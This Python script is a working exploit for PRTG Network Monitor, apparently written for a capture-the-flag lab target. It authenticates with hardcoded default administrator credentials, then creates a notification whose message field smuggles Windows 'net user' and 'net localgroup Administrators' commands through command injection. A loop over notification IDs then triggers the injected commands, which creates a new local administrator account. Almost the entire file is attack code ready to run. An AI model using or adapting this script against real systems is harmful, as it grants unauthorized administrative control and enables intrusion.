import requests
import sys
import argparse

# Configure command line arguments
parser = argparse.ArgumentParser(description='Script to exploit PRTG Network Monitor')
parser.add_argument('-u', '--url', required=True, help='Base URL example, http://10.10.10.152')
parser.add_argument('--user', required=True, help='Username that will be added')
parser.add_argument('--password', required=True, help='Password for the new user')
args = parser.parse_args()

# Authentication URL and POST request URLs
login_url = f"{args.url}/public/checklogin.htm"
post_url = f"{args.url}/editsettings"
second_post_url = f"{args.url}/api/notificationtest.htm"

# Authentication parameters
login_payload = {
    'loginurl': '',
    'username': 'prtgadmin',
    'password': 'PrTg@dmin2019'
}

# Create a session
session = requests.Session()

# Authenticate
auth_response = session.post(login_url, data=login_payload)

# Check if authentication was successful
if auth_response.status_code == 200 and "Logout" in auth_response.text:
    print("Authentication successful")
else:
    print("Authentication failed")
    sys.exit(1)

# Get session cookies
cookies = session.cookies.get_dict()
cookie_header = '; '.join([f'{key}={value}' for key, value in cookies.items()])

# POST request headers
headers = {
    'Host': args.url.replace('http://', '').replace('https://', ''),
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': args.url,
    'Connection': 'close',
    'Referer': f'{args.url}/editnotification.htm?id=new&tabid=1',
    'Cookie': cookie_header 
}

# Data to be sent in the body of the first POST request
post_data = {
    "name_": "Pwn123",
    "tags_": "",
    "active_": "1",
    "schedule_": "-1|None|",
    "postpone_": "1",
    "comments_": "",
    "summode_": "2",
    "summarysubject_": "[%sitename] %summarycount Summarized Notifications",
    "summinutes_": "1",
    "accessrights_": "1",
    "accessrights_201": "0",
    "active_1": "0",
    "addressuserid_1": "-1",
    "addressgroupid_1": "-1",
    "address_1": "",
    "subject_1": "[%sitename] %device %name %status %down (%message)",
    "contenttype_1": "text/html",
    "customtext_1": "",
    "priority_1": "0",
    "active_17": "0",
    "addressuserid_17": "-1",
    "addressgroupid_17": "-1",
    "message_17": "[%sitename] %device %name %status %down (%message)",
    "active_8": "0",
    "addressuserid_8": "-1",
    "addressgroupid_8": "-1",
    "address_8": "",
    "message_8": "[%sitename] %device %name %status %down (%message)",
    "active_2": "0",
    "eventlogfile_2": "application",
    "sender_2": "PRTG Network Monitor",
    "eventtype_2": "error",
    "message_2": "[%sitename] %device %name %status %down (%message)",
    "active_13": "0",
    "sysloghost_13": "",
    "syslogport_13": "514",
    "syslogfacility_13": "1",
    "syslogencoding_13": "1",
    "message_13": "[%sitename] %device %name %status %down (%message)",
    "active_14": "0",
    "snmphost_14": "",
    "snmpport_14": "162",
    "snmpcommunity_14": "",
    "snmptrapspec_14": "0",
    "messageid_14": "0",
    "message_14": "[%sitename] %device %name %status %down (%message)",
    "senderip_14": "",
    "active_9": "0",
    "url_9": "",
    "urlsniselect_9": "0",
    "urlsniname_9": "",
    "postdata_9": "",
    "active_10": "1",
    "address_10": "Demo EXE Notification - OutFile.ps1",
    "message_10": f"test.txt;net user {args.user} {args.password} /add;net localgroup Administrators {args.user} /add",
    "windowslogindomain_10": "",
    "windowsloginusername_10": "",
    "windowsloginpassword_10": "",
    "timeout_10": "60",
    "active_15": "0",
    "accesskeyid_15": "",
    "secretaccesskeyid_15": "",
    "arn_15": "",
    "subject_15": "",
    "message_15": "[%sitename] %device %name %status %down (%message)",
    "active_16": "0",
    "isusergroup_16": "1",
    "addressgroupid_16": "200|PRTG Administrators",
    "ticketuserid_16": "100|PRTG System Administrator",
    "subject_16": "%device %name %status %down (%message)",
    "message_16": "Sensor: %name\nStatus: %status %down\n\nDate/Time: %datetime (%timezone)\nLast Result: %lastvalue\nLast Message: %message\n\nProbe: %probe\nGroup: %group\nDevice: %device (%host)\n\nLast Scan: %lastcheck\nLast Up: %lastup\nLast Down: %lastdown\nUptime: %uptime\nDowntime: %downtime\nCumulated since: %cumsince\nLocation: %location\n\n",
    "autoclose_16": "1",
    "objecttype": "notification",
    "id": "new",
    "targeturl": "/myaccount.htm?tabid=2"
}

# Make the first POST request
response = session.post(post_url, headers=headers, data=post_data)

# Check the response status
if response.status_code == 200:
    print("First POST successful")
else:
    print(f"Error on the POST: {response.status_code}")

# Headers for the second POST request (reusing the same headers)
headers['Referer'] = f'{args.url}/myaccount.htm?tabid=2'  # Update the Referer if necessary
headers['Content-Length'] = '7'

# Data to be sent in the body of the second POST request
second_post_data = {
    'id': '2018'
}

# Make the second POST request for a range of IDs
for id in range(2018, 2044):
    second_post_data['id'] = str(id)
    response = session.post(second_post_url, headers=headers, data=second_post_data)
    print(f"Trying with id: {id}")
    if response.status_code == 200:
        print("Request POST successful")
    else:
        print(f"Error on the second POST request: {response.status_code}")
